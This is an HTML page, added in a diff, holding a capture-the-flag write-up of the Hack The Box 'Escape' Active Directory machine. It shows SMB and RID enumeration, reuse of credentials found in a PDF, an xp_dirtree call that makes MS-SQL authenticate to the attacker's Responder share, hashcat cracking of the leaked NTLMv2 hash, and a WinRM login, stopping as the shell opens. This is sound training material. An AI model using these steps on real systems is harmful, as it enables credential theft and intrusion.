@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Escape | Paracausal Telemetry</title><meta name="description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), MS-SQL (1433), Compromising sql_svc." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-escape/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Escape" /><meta property="og:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), MS-SQL (1433), Compromising sql_svc." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-escape/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-escape/og.png?v=f266b0c7" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Escape" /><meta name="twitter:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), MS-SQL (1433), Compromising sql_svc." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-escape/og.png?v=f266b0c7" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Escape","description":"Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), MS-SQL (1433), Compromising sql_svc.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-escape/","datePublished":"2026-03-20","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Escape","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-escape/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Escape</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-03-20 · 14 min read</p><h1>Escape</h1><p>Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), MS-SQL (1433), Compromising sql_svc.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · medium</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Escape" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-escape.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-escape.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Escape</h2><p>Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>25 Feb 2023</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>Geiseric</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>10,807</dd></div><div><dt>Root owns</dt><dd>9,565</dd></div><div><dt>User blood</dt><dd>pottm<small class="room-blood-time">0H 14M 14S</small></dd></div><div><dt>Root blood</dt><dd>Embargo<small class="room-blood-time">0H 29M 17S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 9093 votes from easiest to hardest"><rect x="0" y="56" width="20" height="8" rx="2" fill="hsl(96 70% 55%)"><title>319 votes</title></rect><rect x="26" y="56" width="20" height="8" rx="2" fill="hsl(96 70% 55%)"><title>314 votes</title></rect><rect x="52" y="17" width="20" height="47" rx="2" fill="hsl(80 70% 55%)"><title>1881 votes</title></rect><rect x="78" y="2" width="20" height="62" rx="2" fill="hsl(70 70% 55%)"><title>2474 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>2562 votes</title></rect><rect x="130" y="42" width="20" height="22" rx="2" fill="hsl(38 70% 55%)"><title>898 votes</title></rect><rect x="156" y="53" width="20" height="11" rx="2" fill="hsl(28 70% 55%)"><title>451 votes</title></rect><rect x="182" y="62" width="20" height="2" rx="2" fill="hsl(16 70% 55%)"><title>98 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>29 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>67 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.8, Real-Life 6.7, CVE 5.7, Custom Exploitation 4.3, CTF-Like 3.3"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,62.4 154.6,95.5 133.5,142.3 92.3,134.4 88.0,102.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Escape" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.7.67 -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 15:32 GMT
+Nmap scan report for 10.129.7.67
+Host is up (0.013s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49669/tcp open  unknown
+49691/tcp open  unknown
+49692/tcp open  unknown
+49704/tcp open  unknown
+49714/tcp open  unknown
+49742/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 65.71 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -A --min-rate=2000 -sT 10.129.7.67 -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 15:37 GMT
+Nmap scan report for 10.129.7.67
+Host is up (0.013s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-20 23:37:34Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-03-20T23:25:18
+|_Not valid after:  2056-03-20T23:25:18
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null authentication is enabled, but cannot list users or access shares</p><h3>Guest access</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.sequel.htb -u &#39;Guest&#39; -p &#39;&#39; --shares
+SMB         10.129.7.67     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.7.67     445    DC               [+] sequel.htb\Guest: 
+SMB         10.129.7.67     445    DC               [*] Enumerated shares
+SMB         10.129.7.67     445    DC               Share           Permissions     Remark
+SMB         10.129.7.67     445    DC               -----           -----------     ------
+SMB         10.129.7.67     445    DC               ADMIN$                          Remote Admin
+SMB         10.129.7.67     445    DC               C$                              Default share
+SMB         10.129.7.67     445    DC               IPC$            READ            Remote IPC
+SMB         10.129.7.67     445    DC               NETLOGON                        Logon server share 
+SMB         10.129.7.67     445    DC               Public          READ            
+SMB         10.129.7.67     445    DC               SYSVOL                          Logon server share</code></pre><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.sequel.htb -u &#39;Guest&#39; -p &#39;&#39; --rid-brute             
+SMB         10.129.7.67     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.7.67     445    DC               [+] sequel.htb\Guest: 
+SMB         10.129.7.67     445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.7.67     445    DC               500: sequel\Administrator (SidTypeUser)
+SMB         10.129.7.67     445    DC               501: sequel\Guest (SidTypeUser)
+SMB         10.129.7.67     445    DC               502: sequel\krbtgt (SidTypeUser)
+SMB         10.129.7.67     445    DC               512: sequel\Domain Admins (SidTypeGroup)
+SMB         10.129.7.67     445    DC               513: sequel\Domain Users (SidTypeGroup)
+SMB         10.129.7.67     445    DC               514: sequel\Domain Guests (SidTypeGroup)
+SMB         10.129.7.67     445    DC               515: sequel\Domain Computers (SidTypeGroup)
+SMB         10.129.7.67     445    DC               516: sequel\Domain Controllers (SidTypeGroup)
+SMB         10.129.7.67     445    DC               517: sequel\Cert Publishers (SidTypeAlias)
+SMB         10.129.7.67     445    DC               518: sequel\Schema Admins (SidTypeGroup)
+SMB         10.129.7.67     445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
+SMB         10.129.7.67     445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.7.67     445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.7.67     445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.7.67     445    DC               525: sequel\Protected Users (SidTypeGroup)
+SMB         10.129.7.67     445    DC               526: sequel\Key Admins (SidTypeGroup)
+SMB         10.129.7.67     445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.7.67     445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.7.67     445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.7.67     445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.7.67     445    DC               1000: sequel\DC$ (SidTypeUser)
+SMB         10.129.7.67     445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
+SMB         10.129.7.67     445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.7.67     445    DC               1103: sequel\Tom.Henn (SidTypeUser)
+SMB         10.129.7.67     445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
+SMB         10.129.7.67     445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
+SMB         10.129.7.67     445    DC               1106: sequel\sql_svc (SidTypeUser)
+SMB         10.129.7.67     445    DC               1107: sequel\James.Roberts (SidTypeUser)
+SMB         10.129.7.67     445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
+SMB         10.129.7.67     445    DC               1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</code></pre><p>From this i have made a userlist which i can use to try things like asrep roasting</p><p>AS-REP roasting failed</p><p>My next move is to access the <code>Public</code> SMB share</p><h3><code>Public</code> share</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient.py sequel.htb/&#39;Guest&#39;:&#39;&#39;@dc.sequel.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Public
+SYSVOL
+# use Public
+# ls
+drw-rw-rw-          0  Sat Nov 19 11:51:25 2022 .
+drw-rw-rw-          0  Sat Nov 19 11:51:25 2022 ..
+-rw-rw-rw-      49551  Sat Nov 19 11:51:25 2022 SQL Server Procedures.pdf</code></pre><p>Ive transferred this to my machine</p><p>Ill take a look in libre office</p><h3>SQL Server Procedures.pdf</h3><p>Found a default username and password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PublicUser:GuestUserCantWrite1</code></pre><p>Ill test these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc mssql dc.sequel.htb -u PublicUser -p &#39;GuestUserCantWrite1&#39; --local-auth 
+MSSQL       10.129.7.67     1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (EncryptionReq:False)
+MSSQL       10.129.7.67     1433   DC               [+] DC\PublicUser:GuestUserCantWrite1</code></pre><p>This account is just a guest account but this user has access to ms-sql</p><h2>MS-SQL (1433)</h2><h3>Metasploit enum logons</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf auxiliary(admin/mssql/mssql_enum_sql_logins) &gt; run
+[*] Running module against 10.129.7.67
+[*] 10.129.7.67:1433 - Attempting to connect to the database server at 10.129.7.67:1433 as PublicUser...
+[+] 10.129.7.67:1433 - Connected.
+[*] 10.129.7.67:1433 - Checking if PublicUser has the sysadmin role...
+[*] 10.129.7.67:1433 - PublicUser is NOT a sysadmin.
+[*] 10.129.7.67:1433 - Setup to fuzz 300 SQL Server logins.
+[*] 10.129.7.67:1433 - Enumerating logins...
+[+] 10.129.7.67:1433 - 36 initial SQL Server logins were found.
+[*] 10.129.7.67:1433 - Verifying the SQL Server logins...
+[+] 10.129.7.67:1433 - 17 SQL Server logins were verified:
+[*] 10.129.7.67:1433 -  - ##MS_AgentSigningCertificate##
+[*] 10.129.7.67:1433 -  - ##MS_PolicyEventProcessingLogin##
+[*] 10.129.7.67:1433 -  - ##MS_PolicySigningCertificate##
+[*] 10.129.7.67:1433 -  - ##MS_PolicyTsqlExecutionLogin##
+[*] 10.129.7.67:1433 -  - ##MS_SQLAuthenticatorCertificate##
+[*] 10.129.7.67:1433 -  - ##MS_SQLReplicationSigningCertificate##
+[*] 10.129.7.67:1433 -  - ##MS_SQLResourceSigningCertificate##
+[*] 10.129.7.67:1433 -  - ##MS_SmoExtendedSigningCertificate##
+[*] 10.129.7.67:1433 -  - BUILTIN\Users
+[*] 10.129.7.67:1433 -  - NT AUTHORITY\SYSTEM
+[*] 10.129.7.67:1433 -  - NT SERVICE\SQLTELEMETRY$SQLMOCK
+[*] 10.129.7.67:1433 -  - NT SERVICE\SQLWriter
+[*] 10.129.7.67:1433 -  - NT SERVICE\Winmgmt
+[*] 10.129.7.67:1433 -  - NT Service\MSSQL$SQLMOCK
+[*] 10.129.7.67:1433 -  - PublicUser
+[*] 10.129.7.67:1433 -  - sa
+[*] 10.129.7.67:1433 -  - sequel\Administrator
+[*] Auxiliary module execution completed
+msf auxiliary(admin/mssql/mssql_enum_sql_logins) &gt; </code></pre><p>These are all the users with logon to MS-SQL</p><h3>All databases</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQL (PublicUser  guest@master)&gt; select name from master..sysdatabases;
+name     
+------   
+master   
+tempdb   
+model    
+msdb</code></pre><p>These are all the databases on the system</p><p>Also something to note is that xp_cmdshell is disabled</p><p>After looking through the DBs there is nothing in them</p><p>My idea is to try and force a connection from the DB to a SMB share ill setup on my machine</p><h2>Compromising <code>sql_svc</code></h2><p>First ill start Responder</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQL (PublicUser  guest@master)&gt; EXEC xp_dirtree &#39;\\10.10.14.90\share&#39;;</code></pre><p>This will force a connection back to responder</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[SMB] NTLMv2-SSP Client   : 10.129.7.162
+[SMB] NTLMv2-SSP Username : sequel\sql_svc
+[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1c7304fad9f1b57f:796233AE76DFA2C01C6408694BAD2AC2:0101000000000000007F20794FB9DC0128921C4A213B82FF00000000020008004E00350037004C0001001E00570049004E002D0045004B0049004B00320047004D003200350032004F0004003400570049004E002D0045004B0049004B00320047004D003200350032004F002E004E00350037004C002E004C004F00430041004C00030014004E00350037004C002E004C004F00430041004C00050014004E00350037004C002E004C004F00430041004C0007000800007F20794FB9DC0106000400020000000800300030000000000000000000000000300000091AB64D9473F92C038B8F29F638CC5760B5A6A1134F91CB62960E3A4C0271210A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000</code></pre><p>I have now captured the hash of the <code>sql_svc</code> account</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat sql-svc.hash /usr/share/wordlists/rockyou.txt
+
+SQL_SVC::sequel:1c7304fad9f1b57f:796233ae76dfa2c01c6408694bad2ac2:0101000000000000007f20794fb9dc0128921c4a213b82ff00000000020008004e00350037004c0001001e00570049004e002d0045004b0049004b00320047004d003200350032004f0004003400570049004e002d0045004b0049004b00320047004d003200350032004f002e004e00350037004c002e004c004f00430041004c00030014004e00350037004c002e004c004f00430041004c00050014004e00350037004c002e004c004f00430041004c0007000800007f20794fb9dc0106000400020000000800300030000000000000000000000000300000091ab64d9473f92c038b8f29f638cc5760b5a6a1134f91cb62960e3a4c0271210a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390030000000000000000000:REGGIE1234ronnie</code></pre><p>I will now test these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sql_svc:REGGIE1234ronnie</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.sequel.htb -u &#39;sql_svc&#39; -p &#39;REGGIE1234ronnie&#39; --shares 
+SMB         10.129.7.162    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.7.162    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+SMB         10.129.7.162    445    DC               [*] Enumerated shares
+SMB         10.129.7.162    445    DC               Share           Permissions     Remark
+SMB         10.129.7.162    445    DC               -----           -----------     ------
+SMB         10.129.7.162    445    DC               ADMIN$                          Remote Admin
+SMB         10.129.7.162    445    DC               C$                              Default share
+SMB         10.129.7.162    445    DC               IPC$            READ            Remote IPC
+SMB         10.129.7.162    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.7.162    445    DC               Public          READ            
+SMB         10.129.7.162    445    DC               SYSVOL          READ            Logon server share</code></pre><p>These credentials work</p><p>Here is the access i have on <code>sql_svc</code> user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc winrm dc.sequel.htb -u &#39;sql_svc&#39; -p &#39;REGGIE1234ronnie&#39;               
+WINRM       10.129.7.162    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.7.162    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)</code></pre><p>This user also has access via winrm</p><h3>Shell access as <code>sql_svc</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.sequel.htb -u sql_svc -p REGGIE1234ronnie
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
